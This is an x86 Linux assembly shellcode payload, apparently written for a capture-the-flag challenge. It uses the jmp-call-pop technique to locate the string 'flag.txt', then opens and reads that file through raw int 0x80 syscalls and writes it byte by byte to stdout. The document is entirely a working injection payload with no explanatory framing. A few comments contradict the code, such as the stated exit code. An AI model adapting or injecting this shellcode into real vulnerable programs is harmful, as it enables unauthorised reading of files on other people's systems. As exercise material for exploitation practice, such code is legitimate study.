jmp short bottom    ; relative addressing start

top:    
; setup params for open()
pop ebx         ; param1 ebx now holds 'key' 
xor ecx, ecx        ; param2 ecx corresponds to flag O_RDONLY
; param3 edx not required for existing file
xor eax, eax        ; clear eax to 0
mov al, 5       ; syscall open()
int 0x80        ; software interrupt to call open()
; returns int filedescriptor in eax

; setup params for read() and write()
mov ebx, eax        ; param1 ebx now holds filedescriptor   
sub esp, 1      ; allocate buffer of 1 bytes on stack
mov ecx, esp        ; param2 ecx now points to buffer
xor edx, edx        ; clear edx
inc edx         ; param3 edx set to 1 byte to be read   
rwloop:
xor eax, eax        ; clear eax
mov al, 3       ; syscall code for read()
int 0x80        ; read() 1 byte into buffer
test eax,eax        ; if eax=0, read() reached EoF
jz end          ; and stop reading/writing

; else get ready to write
push ebx        ; store filedescriptor for KEY onto stack 
xor ebx, ebx        ; clear ebx
inc ebx         ; param1 ebx = 1 for stdout
; param2 and param3 same from read()
xor eax, eax        ; clear eax
mov al, 4       ; syscall for write()
int 0x80
pop ebx         ; restore filedescriptor to ebx
jmp rwloop      

end:
; place esp back to original point on stack
; add esp, 1

; exit cleanly
xor ebx,ebx     ; retcode = 1
xor eax,eax     ; eax = 0
inc eax         ; eax = 1, syscall exit(1)
int 0x80

bottom:
call top        ; address of key pushed on stack
db 'flag.txt', 0
